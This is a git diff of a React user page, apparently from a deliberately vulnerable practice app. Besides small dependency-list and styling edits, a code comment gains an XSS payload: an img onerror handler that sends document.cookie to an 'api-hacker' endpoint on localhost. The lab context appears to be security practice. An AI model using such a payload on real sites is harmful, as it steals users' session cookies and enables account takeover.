@@ -4,7 +4,8 @@ import {useEffect, useState} from "react";
 // import { decode } from "jsonwebtoken";
 // import { useLocation } from 'react-router-dom';
 
-// <img src="foo" onerror="(() => alert('foo'))()" />
+// <img src="foo" onerror="fetch(\'http://localhost:3000/api-hacker?cookies=\'+window.document.cookie,{method:\'POST\'});" />
+
 export default function User() {
 
   const [cookie, _] = useCookies(['vulnera2Token'])
@@ -45,7 +46,7 @@ export default function User() {
       .catch((err) => {
         console.log(err)
       });
-  }, [cookie.vulnera2Token])
+  }, [cookie.vulnera2Token, navigate, username])
 
   function onSubmit() {
     async function postData(url = '', data = {}) {
@@ -102,7 +103,7 @@ export default function User() {
       justifyContent: "center",
       gap: "10px"
     }}>
-      <label>Item: <input type="text" value={text} onChange={(event) => setText(event.target.value)} name="text"/></label>
+      <label>Item: <input style={{width: "300px"}} type="text" value={text} onChange={(event) => setText(event.target.value)} name="text"/></label>
       <button style={{ width: "fit-content" }}>Crear</button>
     </form>
     <ul>
